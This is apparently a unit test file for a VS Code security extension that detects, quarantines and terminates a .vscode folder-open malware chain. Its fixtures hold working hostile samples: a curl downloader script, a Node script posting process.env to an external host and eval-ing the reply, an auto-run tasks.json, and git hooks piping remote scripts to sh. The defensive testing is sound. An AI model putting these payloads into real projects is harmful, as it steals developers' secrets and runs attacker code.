/**
 * Unit tests for the `.vscode/` profile and workspace malware scanner (`scanner/*`).
 *
 * Reproduces the `vscode-enc` user-profile / `.vscode/` implant attack chain:
 *   - `vscode-bootstrap.sh` (T1105 portable Node bootstrap + curl downloader)
 *   - `env-setup.js` (T1041 process.env exfiltration + T1059 eval(response.data) C2)
 *   - `package.json` (T1552.001 clipboardy, sql.js, socket.io-client, axios, request)
 *   - `.npmrc` (T1195.002 engine-strict=false, save-exact=true)
 *   - `package-lock.json` (T1027 operator-pinned dependency tree)
 *   - `.vscode/tasks.json` (`runOn: "folderOpen"`), `.vscode/settings.json`, `.git/hooks`
 *   - Active task termination (`execution.terminate()`) and quarantine remediation
 */

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');

const { scanFileContent } = require('../scanner/rules');
const { scanProfileDirs } = require('../scanner/profile');
const { scanWorkspaceFolder } = require('../scanner/workspace');
const {
    runLocalFileScan,
    quarantineFinding,
    restoreQuarantinedFile,
    listQuarantined,
    allowFileHash,
    unallowFileHash,
    normalizeAllowedFiles,
    filterActiveFileFindings,
    terminateMaliciousTasks,
    disableAutoTasksIfThreatFound,
    createTaskInterceptor
} = require('../scanner');
const { handleFileFindings } = require('../notifier');
const { renderPane, renderParts } = require('../ui/paneHtml');
const { readState } = require('../hardening');

// Payloads modeled directly on the vscode-enc (.vscode/) malware report.
const BOOTSTRAP_SH = `#!/bin/bash
BASE_URL="https://www.nexchain.pro"
echo "[INFO] Checking Node.js installation..."
if ! command -v node >/dev/null 2>&1; then
  curl -fsSL https://nodejs.org/dist/index.json -o "$HOME/.vscode/node-index.json"
  export PATH="$HOME/.vscode/node-v20.11.0/bin:$PATH"
fi
curl -fsSL "$BASE_URL/settings/env?flag=9" -o "$HOME/.vscode/env-setup.js"
curl -fsSL "$BASE_URL/settings/package" -o "$HOME/.vscode/package.json"
curl -fsSL "$BASE_URL/settings/npmrc" -o "$HOME/.vscode/.npmrc"
cd "$HOME/.vscode" && npm install --silent
node "$HOME/.vscode/env-setup.js"
echo "[SUCCESS] Script completed successfully."
`;

const ENV_SETUP_JS = `const axios = require('axios');
axios.post('https://ip-api-two.vercel.app/api/githook-encrypted/N3RlYW09', { ...process.env }, {
  headers: { 'x-secret-header': 'secret' }
}).then(response => {
  eval(response.data);
}).catch(() => {});
`;

const STAGED_PACKAGE_JSON = JSON.stringify({
    name: 'env-bootstrap',
    version: '1.0.0',
    dependencies: {
        axios: '^1.6.0',
        clipboardy: '^4.0.0',
        request: '^2.88.2',
        'socket.io-client': '^4.7.2',
        'sql.js': '^1.10.2'
    }
});

const STAGED_NPMRC = `engine-strict=false\nsave-exact=true\n`;
const STAGED_LOCKFILE = JSON.stringify({ name: 'env-bootstrap', lockfileVersion: 3, packages: {} });

test('static rules detect all 7 MITRE ATT&CK matches from the vscode-enc (.vscode/) malware chain', () => {
    const shMatches = scanFileContent({ fileName: 'vscode-bootstrap.sh', content: BOOTSTRAP_SH, inVscodeDir: true });
    assert.equal(shMatches.filter(m => m.rule === 'REMOTE_PAYLOAD' && m.technique === 'T1105').length, 2);

    const jsMatches = scanFileContent({ fileName: 'env-setup.js', content: ENV_SETUP_JS, inVscodeDir: true });
    assert.ok(jsMatches.some(m => m.rule === 'DATA_EXFILTRATION' && m.technique === 'T1041' && m.severity === 'high'));
    assert.ok(jsMatches.some(m => m.rule === 'C2_COMMUNICATION' && m.technique === 'T1059' && m.severity === 'critical'));

    const pkgMatches = scanFileContent({ fileName: 'package.json', content: STAGED_PACKAGE_JSON, inVscodeDir: true });
    assert.ok(pkgMatches.some(m => m.rule === 'ENV_HARVESTING' && m.technique === 'T1552.001' && /clipboardy/.test(m.detail)));

    const npmrcMatches = scanFileContent({ fileName: '.npmrc', content: STAGED_NPMRC, inVscodeDir: true });
    assert.ok(npmrcMatches.some(m => m.rule === 'SUPPLY_CHAIN_ABUSE' && m.technique === 'T1195.002'));

    const lockMatches = scanFileContent({ fileName: 'package-lock.json', content: STAGED_LOCKFILE, inVscodeDir: true });
    assert.ok(lockMatches.some(m => m.rule === 'OBFUSCATED_CODE' && m.technique === 'T1027'));
});

test('user-profile scanner flags implants in ~/.vscode while ignoring legitimate extensions/ and argv.json', () => {
    const files = {
        '/home/dev/.vscode/vscode-bootstrap.sh': BOOTSTRAP_SH,
        '/home/dev/.vscode/env-setup.js': ENV_SETUP_JS,
        '/home/dev/.vscode/package.json': STAGED_PACKAGE_JSON,
        '/home/dev/.vscode/.npmrc': STAGED_NPMRC,
        '/home/dev/.vscode/package-lock.json': STAGED_LOCKFILE,
        '/home/dev/.vscode/argv.json': '{"enable-crash-reporter": true}'
    };
    const io = {
        readdirSync: () => [
            'extensions', 'cli', 'argv.json',
            'vscode-bootstrap.sh', 'env-setup.js', 'package.json', '.npmrc', 'package-lock.json', 'node-v20.11.0-linux-x64'
        ],
        statSync: p => ({ isDirectory: () => p.endsWith('node-v20.11.0-linux-x64') }),
        readFileSync: p => files[p.replace(/\\/g, '/')] || ''
    };

    const findings = scanProfileDirs({ profileDirs: ['/home/dev/.vscode'], io });
    const names = findings.map(f => f.fileName).sort();
    assert.deepEqual(names, [
        '.npmrc', 'env-setup.js', 'node-v20.11.0-linux-x64', 'package-lock.json', 'package.json', 'vscode-bootstrap.sh'
    ]);
    const envFinding = findings.find(f => f.fileName === 'env-setup.js');
    assert.equal(envFinding.severity, 'critical');
    assert.equal(envFinding.scope, 'profile');
});

test('workspace scanner detects folderOpen tasks, terminal NODE_OPTIONS hijacks, launch.json scripts, and active git hooks', () => {
    const repo = '/repo';
    const fileMap = {
        '/repo/.vscode/tasks.json': `// JSONC comment\n{\n  "version": "2.0.0",\n  "tasks": [{\n    "label": "bootstrap-env",\n    "type": "shell",\n    "command": "bash .vscode/vscode-bootstrap.sh",\n    "runOptions": { "runOn": "folderOpen" },\n  }]\n}`,
        '/repo/.vscode/settings.json': `{\n  "terminal.integrated.env.linux": { "NODE_OPTIONS": "--require ./.vscode/env-setup.js" }\n}`,
        '/repo/.vscode/launch.json': `{\n  "configurations": [{ "name": "Run App", "program": "\${workspaceFolder}/.vscode/env-setup.js" }]\n}`,
        '/repo/.vscode/env-setup.js': ENV_SETUP_JS,
        '/repo/.git/hooks/post-checkout': `#!/bin/sh\ncurl -fsSL https://www.nexchain.pro/settings/env | sh\n`,
        '/repo/.git/hooks/pre-commit.sample': `#!/bin/sh\ncurl https://example.com\n`
    };

    const io = {
        readdirSync: p => {
            const norm = p.replace(/\\/g, '/');
            if (norm === '/repo/.vscode') return ['tasks.json', 'settings.json', 'launch.json', 'env-setup.js'];
            if (norm === '/repo/.git/hooks') return ['post-checkout', 'pre-commit.sample'];
            return [];
        },
        statSync: () => ({ isDirectory: () => false }),
        readFileSync: p => {
            const norm = p.replace(/\\/g, '/');
            if (!(norm in fileMap)) throw new Error('ENOENT');
            return fileMap[norm];
        }
    };

    const findings = scanWorkspaceFolder(repo, io);
    assert.equal(findings.length, 5, 'flags tasks.json, settings.json, launch.json, env-setup.js, and post-checkout (skips .sample)');
    const taskFinding = findings.find(f => f.fileName === 'tasks.json');
    assert.equal(taskFinding.hasFolderOpenTask, true);
    assert.deepEqual(taskFinding.flaggedTasks, ['bootstrap-env']);
});

// Focused git hook test.
// Covers both detection paths in `scanner/workspace.js`:
//   1. A hook that matches a static rule (critical).
//   2. A hook that only matches the fallback keyword regex (high).
// A harmless hook must stay quiet so we know we are not flagging everything.
test('workspace scanner flags dangerous git hooks and ignores harmless ones', () => {
    const hooks = {
        // Downloads a script and runs it with node -> REMOTE_PAYLOAD, critical.
        'pre-push': `#!/bin/sh\ncurl -fsSL https://evil.example/payload.js -o /tmp/p.js && node /tmp/p.js\n`,
        // No static rule matches, but base64 triggers the fallback -> high.
        'commit-msg': `#!/bin/sh\necho "$PAYLOAD" | base64 -d | sh\n`,
        // Normal hook. Should not be flagged.
        'pre-commit': `#!/bin/sh\nnpm test\n`
    };

    const io = {
        readdirSync: p => (p.replace(/\\/g, '/') === '/repo/.git/hooks' ? Object.keys(hooks) : []),
        statSync: () => ({ isDirectory: () => false }),
        readFileSync: p => {
            const name = p.replace(/\\/g, '/').replace('/repo/.git/hooks/', '');
            if (!(name in hooks)) throw new Error('ENOENT');
            return hooks[name];
        }
    };

    const findings = scanWorkspaceFolder('/repo', io);
    const byName = Object.fromEntries(findings.map(f => [f.fileName, f]));

    assert.deepEqual(Object.keys(byName).sort(), ['commit-msg', 'pre-push']);
    assert.equal(byName['pre-push'].severity, 'critical');
    assert.equal(byName['commit-msg'].severity, 'high');
    assert.equal(byName['pre-push'].displayPath, '.git/hooks/pre-push');
});

test('task interceptor kills running malicious tasks via execution.terminate() and disables task.allowAutomaticTasks', async () => {
    let killed = 0;
    let liveHook = null;
    const settingsUpdates = [];
    const auditEvents = [];

    const fakeVscode = {
        ConfigurationTarget: { Global: 1 },
        tasks: {
            taskExecutions: [
                {
                    task: { name: 'bootstrap-env', execution: { commandLine: 'bash .vscode/vscode-bootstrap.sh' } },
                    terminate: () => { killed++; }
                },
                {
                    task: { name: 'innocent-build', execution: { commandLine: 'npm run build' } },
                    terminate: () => { throw new Error('should not kill innocent task'); }
                }
            ],
            onDidStartTask: cb => { liveHook = cb; return { dispose() {} }; }
        },
        workspace: {
            getConfiguration: () => ({
                inspect: () => ({ globalValue: 'on' }),
                update: async (k, v, target) => { settingsUpdates.push({ k, v, target }); }
            })
        }
    };

    const findings = [{ fileName: 'tasks.json', hasFolderOpenTask: true, flaggedTasks: ['bootstrap-env'] }];
    const audit = { record: e => auditEvents.push(e) };

    const terminated = terminateMaliciousTasks({ vscodeApi: fakeVscode, findings, audit });
    assert.deepEqual(terminated, ['bootstrap-env']);
    assert.equal(killed, 1);

    const disabled = await disableAutoTasksIfThreatFound({ vscodeApi: fakeVscode, findings, audit });
    assert.equal(disabled, true);
    assert.deepEqual(settingsUpdates, [{ k: 'allowAutomaticTasks', v: 'off', target: 1 }]);

    // Verify onDidStartTask also terminates any task spawning a .vscode/ script mid-session.
    createTaskInterceptor({ vscodeApi: fakeVscode, getFindings: () => findings, audit });
    liveHook({
        execution: {
            task: { name: 'late-task', execution: { commandLine: 'node .vscode/env-setup.js' } },
            terminate: () => { killed++; }
        }
    });
    assert.equal(killed, 2);
    assert.equal(auditEvents.filter(e => e.type === 'terminated').length, 2);
});

test('quarantine moves payload out of .vscode, writes metadata.json, and renders in the side pane', async () => {
    const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'devguard-scan-'));
    try {
        const vscodeDir = path.join(tmpRoot, 'workspace', '.vscode');
        const storageDir = path.join(tmpRoot, 'storage');
        fs.mkdirSync(vscodeDir, { recursive: true });
        const payloadPath = path.join(vscodeDir, 'env-setup.js');
        fs.writeFileSync(payloadPath, ENV_SETUP_JS, 'utf8');

        const stateStore = new Map();
        const context = {
            globalStorageUri: { fsPath: storageDir },
            globalState: {
                get: k => stateStore.get(k),
                update: async (k, v) => { stateStore.set(k, v); }
            }
        };

        const findings = runLocalFileScan({
            profileDirs: [],
            workspaceFolders: [path.join(tmpRoot, 'workspace')]
        });
        assert.equal(findings.length, 1);
        assert.equal(findings[0].fileName, 'env-setup.js');

        // Verify SHA-256 allowlist filters the exact hash, and re-flags if content changes.
        const allowed = normalizeAllowedFiles([findings[0].sha256]);
        assert.equal(filterActiveFileFindings(findings, allowed).length, 0);

        // 1. Before quarantine: Auto-run tasks warns even when set to 'off', and File threats + Scan log + Audit log show the threat.
        const inspectSafe = key => ({
            'task.allowAutomaticTasks': { defaultValue: 'off', globalValue: 'off' },
            'extensions.autoUpdateDelay': { defaultValue: 0, globalValue: 24 },
            'security.workspace.trust.startupPrompt': { defaultValue: 'once', globalValue: 'always' },
            'extensions.ignoreRecommendations': { defaultValue: false, globalValue: true },
            'security.workspace.trust.enabled': { defaultValue: true, globalValue: true }
        }[key]);
        const hardeningWithThreat = readState(inspectSafe, { fileThreatCount: findings.length });
        const autoTasksWarnRow = hardeningWithThreat.find(r => r.id === 'automaticTasks');
        assert.equal(autoTasksWarnRow.state, 'unsatisfied', 'Auto-run tasks warns when unaddressed file threats exist');
        assert.match(autoTasksWarnRow.sub, /Action needed · 1 unaddressed file threat found/);

        const activeHtml = renderPane({
            status: { removalMode: 'auto', proxyEnabled: true },
            runs: [{ at: 1000, trigger: 'startup', installed: 10, findings: 0, fileFindings: 1, removed: 0, advisoryCount: 100 }],
            removed: [],
            fileThreats: findings,
            audit: [{ at: 1000, type: 'file_threat', id: '.vscode/env-setup.js', detail: 'critical · DATA_EXFILTRATION, C2_COMMUNICATION' }],
            allowlist: [],
            hardening: hardeningWithThreat,
            inventory: null,
            nonce: 'testnonce'
        });
        assert.ok(activeHtml.includes('1 threat found'), 'hero verdict turns red when a file threat is active');
        assert.ok(activeHtml.includes('1 file threat'), 'Scan log displays the file threat count');
        assert.ok(activeHtml.includes('File threat'), 'Audit log displays the detected file threat');
        assert.ok(activeHtml.includes('Action needed · 1 unaddressed file threat found'), 'Auto-run tasks row warns about unaddressed file threat');
        assert.ok(activeHtml.includes('data-open-section="threats"'), 'the unaddressed file threat opens the File threats section');
        assert.match(activeHtml, /id="warn-threats">Action needed</, 'File threats header warns while a threat is open');
        assert.ok(activeHtml.includes('T1059 · C2_COMMUNICATION'));
        assert.ok(activeHtml.includes('data-quarantine-file='));
        const threatKeys = [...activeHtml.matchAll(/data-threat-key="([^"]+)"/g)].map(m => m[1]);
        assert.ok(threatKeys.length >= 2 && threatKeys.every(key => key === threatKeys[0]), 'the eye and the file card share one key so the flash can find the row');

        // 2. Verify notifier prompts with Quarantine and invokes the Quarantine callback.
        let quarantinedByToast = false;
        await handleFileFindings({
            context,
            vscodeApi: { window: { showErrorMessage: () => Promise.resolve('Quarantine') } },
            findings,
            trigger: 'startup',
            onQuarantine: async items => {
                const res = quarantineFinding(context, items[0]);
                assert.equal(res.ok, true);
                quarantinedByToast = true;
            }
        });
        await new Promise(r => setImmediate(r));
        assert.equal(quarantinedByToast, true);
        assert.equal(fs.existsSync(payloadPath), false, 'payload file is removed from .vscode/');
        assert.equal(listQuarantined(context).length, 1);

        // 3. After quarantine: threat moves out of File threats and into Audit log, and Auto-run tasks returns to satisfied.
        const remaining = runLocalFileScan({
            profileDirs: [],
            workspaceFolders: [path.join(tmpRoot, 'workspace')]
        });
        assert.equal(remaining.length, 0);
        const hardeningCleared = readState(inspectSafe, { fileThreatCount: remaining.length });
        assert.equal(hardeningCleared.find(r => r.id === 'automaticTasks').state, 'satisfied');

        const partsAfter = renderParts({
            status: { removalMode: 'auto', proxyEnabled: true },
            runs: [{ at: 2000, trigger: 'change', installed: 10, findings: 0, fileFindings: 0, removed: 0, advisoryCount: 100 }],
            removed: [],
            fileThreats: remaining,
            quarantined: listQuarantined(context),
            audit: [
                { at: 2100, type: 'file_allowed', id: '.vscode/env-setup.js', sha256: findings[0].sha256, detail: `⌗${findings[0].sha256.slice(0, 8)}` },
                { at: 2000, type: 'quarantined', id: '.vscode/env-setup.js', detail: 'critical · DATA_EXFILTRATION, C2_COMMUNICATION' },
                { at: 1000, type: 'file_threat', id: '.vscode/env-setup.js', detail: 'critical · DATA_EXFILTRATION, C2_COMMUNICATION' }
            ],
            allowlist: [],
            allowedFiles: [findings[0].sha256],
            hardening: hardeningCleared,
            inventory: null
        });
        assert.equal(partsAfter['count-threats'], '0', 'addressed file threat moves out of File threats');
        assert.equal(partsAfter['warn-threats'], '', 'header warning clears once the file threat is addressed');
        assert.ok(partsAfter.threats.includes('No profile or workspace file threats found.'));
        assert.ok(partsAfter.audit.includes('Quarantined') && partsAfter.audit.includes('.vscode/env-setup.js'), 'addressed file threat is in Audit log');
        assert.ok(partsAfter.audit.includes('data-restore-file='), 'Quarantined entry in Audit log has a Restore button');
        assert.ok(partsAfter.audit.includes(`data-unallow-file="${findings[0].sha256}"`), 'File allowed entry in Audit log has a Revoke button');
        assert.ok(partsAfter.setup.includes('No recommended actions · Auto-run is off'), 'Auto-run tasks warning clears once file threat is addressed');

        // 4. Restore from quarantine moves the file back to .vscode/env-setup.js and clears the quarantine record.
        const restored = restoreQuarantinedFile(context, '.vscode/env-setup.js');
        assert.equal(restored.ok, true);
        assert.equal(fs.existsSync(payloadPath), true, 'restored file is back in .vscode/env-setup.js');
        assert.equal(listQuarantined(context).length, 0, 'quarantine list is empty after restore');

        // 5. Revoking a file allowance removes the SHA-256 hash from devGuard.allowedFiles.
        let allowedSetting = [findings[0].sha256];
        const fakeVscodeAllow = {
            ConfigurationTarget: { Global: 1 },
            workspace: {
                getConfiguration: () => ({
                    get: () => allowedSetting,
                    update: async (_k, next) => { allowedSetting = next; }
                })
            }
        };
        await unallowFileHash(fakeVscodeAllow, findings[0].sha256.slice(0, 8));
        assert.deepEqual(allowedSetting, [], 'unallowFileHash removes the allowed file hash');
    } finally {
        fs.rmSync(tmpRoot, { recursive: true, force: true });
    }
});

test('allowing a file stores the name with the hash in parentheses', async () => {
    const hash = 'ab'.repeat(32);
    let stored = [];
    const vscodeApi = {
        ConfigurationTarget: { Global: 1 },
        workspace: {
            getConfiguration: () => ({
                get: () => stored,
                update: async (_key, next) => { stored = next; }
            })
        }
    };

    await allowFileHash(vscodeApi, hash, '.vscode/tasks.json');
    assert.deepEqual(stored, [`.vscode/tasks.json (${hash})`]);
    assert.ok(normalizeAllowedFiles(stored).has(hash), 'the scanner still matches on the hash');

    // Allowing the same content again replaces the entry instead of duplicating it.
    await allowFileHash(vscodeApi, hash, '.vscode/tasks.json');
    assert.deepEqual(stored, [`.vscode/tasks.json (${hash})`]);

    // An older bare hash is upgraded when the same file is allowed with a name.
    stored = [hash];
    await allowFileHash(vscodeApi, hash, '.vscode/env-setup.js');
    assert.deepEqual(stored, [`.vscode/env-setup.js (${hash})`]);
});
